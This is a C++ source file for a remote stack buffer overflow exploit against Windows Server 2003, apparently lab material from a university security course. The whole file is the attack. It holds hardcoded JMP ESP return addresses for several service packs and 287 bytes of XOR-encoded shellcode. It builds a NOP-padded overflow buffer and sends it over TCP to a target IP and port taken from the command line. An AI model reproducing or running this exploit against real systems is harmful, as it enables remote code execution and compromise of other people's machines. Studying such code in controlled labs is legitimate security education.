/** w32Rattack.cpp
  By Fanping Zeng(USTC).
  cl /Zi /GS- w32Rattack.cpp
*/
//====================================================================

#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib,"ws2_32.lib")

#define JUMPESP 0x7c99a01b  // windows2003 sp2 0x7c99c3c2  sp1=0x7c84fa6a
#define CALLESP 0x7c82334b  // windows2003 sp2 0x7c98c784  sp1=0x7c806b69  0x7c82334b
char shellcode[]=
/* 287=0x11f bytes */
"\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\x08\x01\x80\x34\x0b\xfe\xe2"
"\xfa\xc3\xe8\xeb\xff\xff\xff\x96\x9b\x86\x9b\xfe\x96\x8e\x9f\x9a"
"\xd0\x96\x90\x91\x8a\x9b\x75\x02\x96\xa9\x98\xf3\x01\x96\x9d\x77"
"\x2f\xb1\x96\x37\x42\x58\x95\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e\xa4"
"\x16\xb0\xfe\xfe\xfe\x75\x26\x16\xfb\xfe\xfe\xfe\x17\x30\xfe\xfe"
"\xfe\xaf\xac\xa8\xa9\xab\x75\x12\x75\x29\x7d\x12\xaa\x75\x02\x94"
"\xea\xa7\xcd\x3e\x77\xfa\x71\x1c\x05\x38\xb9\xee\xba\x73\xb9\xee"
"\xa9\xae\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\xac\x94"
"\xfe\x01\x28\x7d\x06\xfe\x8a\xfd\xae\x01\x2d\x75\x1b\xa3\xa1\xa0"
"\xa4\xa7\x3d\xa8\xad\xaf\xac\x16\xef\xfe\xfe\xfe\x7d\x06\xfe\x80"
"\xf9\x75\x26\x16\xe9\xfe\xfe\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f\xce"
"\xfe\xfe\xfe\x75\xbe\xf2\x75\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d\x75"
"\xbd\xc2\x75\xba\xe6\x86\xfd\x3d\x75\x0e\x75\xb0\xe6\x75\xb8\xde"
"\xfd\x3d\x75\xba\x76\x02\xfd\x3d\xa9\x75\x06\x16\xe9\xfe\xfe\xfe"
"\xa1\xc5\x3c\x8a\xf8\x1c\x18\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd\x3d"
"\x75\xba\x76\x02\xfd\x3d\x3d\xad\xaf\xac\xa9\xcd\x2c\xf1\x40\xf9"
"\x7d\x06\xfe\x8a\xed\x75\x24\x75\x34\x3f\x1d\xe7\x3f\x17\xf9\xf5"
"\x27\x75\x2d\xfd\x2e\xb9\x15\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d";

#define ATTACK_BUFF_LEN 1024
#define OFF_SET 0x84   // 132=0x84

int main(int argc, char * argv[]) 
{
    if(argc<3){
        printf("Usage: %s Target IP  TCP-Port-Number.\n", argv[0]);    return 1;
    }
    //----------------------
    // Initialize Winsock.
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != NO_ERROR) {
        printf("Error at WSAStartup()\n");  return 1;
    }
    //----------------------
    // Create a SOCKET for Client
    SOCKET ConnectSocket;
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("Error at socket(): %ld\n", WSAGetLastError());
        WSACleanup();   return 1;
    }

    //----------------------
    // The sockaddr_in structure specifies the address family,
    // IP address, and port for the socket that is being bound.
    sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(argv[1]);
    if(target.sin_addr.s_addr==0)
    {
        closesocket(ConnectSocket);
        return -2;
    }
    target.sin_port = htons(atoi(argv[2]));
    
    iResult = connect( ConnectSocket, (struct sockaddr *)&target,sizeof(target));
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
        return -1;
    }

    // receive from Accept socket
    long lBytesSend;

    char attackStr[ATTACK_BUFF_LEN];
    unsigned long *ps;
    memset(attackStr, 0x90, ATTACK_BUFF_LEN);

    ps = (unsigned long *)(attackStr+OFF_SET);
    *(ps) = JUMPESP;
    strcpy(attackStr+OFF_SET+4, shellcode);

    attackStr[ATTACK_BUFF_LEN - 1] = 0;

    lBytesSend=send(ConnectSocket,attackStr,strlen(attackStr),0);
    if(lBytesSend<=0){
        puts("Error: cannot send");return -1;
    }
    printf("\nConnectSocket ID = %x\n\tSend %d bytes to target\n", ConnectSocket,lBytesSend);

    closesocket(ConnectSocket);

    WSACleanup();
    return 0;
}
